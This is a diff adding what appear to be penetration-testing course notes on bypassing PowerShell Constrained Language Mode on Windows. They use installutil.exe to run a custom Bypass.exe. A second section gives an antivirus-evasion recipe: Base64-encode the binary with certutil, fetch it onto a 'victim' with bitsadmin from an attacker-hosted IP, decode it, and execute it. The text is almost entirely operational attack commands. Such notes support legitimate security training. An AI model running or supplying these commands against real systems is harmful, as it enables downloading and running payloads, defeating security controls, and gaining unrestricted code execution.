@@ -1,3 +1,37 @@
+********************** Powershell CLM Bypass **********************
+
+# Right-clicking on References in the Solution Explorer and choosing Add References.
+# Navigate to the Assemblies menu on the left-hand side and scroll down to System.Configuration.Install
+
+# Add C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35 Autoamtion DLL
+
+# copy C:\Users\Administrator\source\repos\CLM\CLM\bin\x64\Debug\CLM.exe C:\Tools
+
+# C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
+
+# type C:\Tools\test.txt
+FullLanguage
+
+********************** Powershell CLM AV Bypass **********************
+
+To bypass anitvirus, we are going to obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk.
+
+From Dev machine-> 
+
+# certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
+(Move this file to webroot of kali)
+
+From Victim -> 
+
+# bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt
+
+# certutil -decode enc.txt Bypass.exe
+
+# C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
+
+# PS C:\Users\student> $ExecutionContext.SessionState.LanguageMode                                                        
+FullLanguage
+
 **********************  CLM Bypass  **********************
 
 // Cheeck if the language mode is available
